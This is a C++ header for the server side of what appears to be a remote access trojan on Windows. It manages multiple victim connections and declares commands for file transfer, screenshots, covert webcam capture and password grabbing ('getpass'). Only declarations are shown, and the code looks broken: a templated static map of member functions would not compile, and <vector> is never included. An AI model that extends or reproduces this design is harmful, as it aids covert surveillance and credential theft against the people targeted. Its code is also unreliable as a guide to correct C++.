#ifndef SERVER_HPP
#define SERVER_HPP

#include <WinSock2.h>
#include <unordered_map>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <thread>
#include <chrono>
#define BUFFER_SIZE (2048)


//TODO: create different stuct for server and client
struct Commands
{
    void print_help();
    void clear_screen();
    void download(char* filefrom, char* fileto);
    void upload(char* filefrom, char* fileto);
    void screenshot(char* outpath);
    void webcam_snap(char* output);
    void livecam();
    void getpass();
};


class Server : Commands
{
public:
    Server(const char* port);
    void handler_print_help();
    int quit_gracefully();
    void initialize();
    void create_socket();
    void bind_socket();
    void accept_connections();
    void start_handler();
    void list_connections();
    bool change_target(unsigned short int target);
    //void read_command_output();
    //void recvall();
    void send_commands();


private: // VARIABLES
    WSADATA wsaData;
    struct addrinfo* AddrInfo = NULL;
    struct addrinfo hints;
    
    SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    int iResult;
    int iSendResult;
    char rdata[BUFFER_SIZE];
    LPCTSTR rdata_rd;

    const char* lport;
    std::vector<SOCKET> all_connections;
    std::vector<std::string> all_addresses;

private: // COMMAND LOOKUP
    template <typename T>
    static std::unordered_map <std::string, T> command_lookup = {
        {"shellhelp", print_help },
        {"clear", clear_screen },
        {"download", download},
        {"upload", upload},
        {"screenshot", screenshot},
        {"webcam", webcam_snap},
        {"livecam", livecam},
        {"getpass", getpass}
    };
};

#endif //SERVER_HPP
